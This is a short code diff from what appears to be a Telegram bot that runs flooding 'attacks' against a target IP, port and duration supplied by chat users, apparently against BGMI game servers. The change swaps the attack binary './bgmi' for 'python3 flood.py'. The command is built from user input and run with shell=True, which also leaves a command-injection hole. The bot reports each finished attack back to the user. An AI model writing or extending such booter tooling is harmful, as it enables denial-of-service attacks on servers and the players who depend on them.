@@ -325,7 +325,7 @@ def handle_bgmi(message):
                 # Start the attack in a non-blocking thread
                 import threading
                 def run_attack():
-                    full_command = f"./bgmi {target} {port} {time} 500"
+                    full_command = f"python3 flood.py {target} {port} {time} 500" # Changed from ./bgmi to python3 flood.py
                     subprocess.run(full_command, shell=True)
                     response = f"BGMI Attack Finished ✅. Target: {target} Port: {port} Time: {time}"
                     bot.reply_to(message, response)
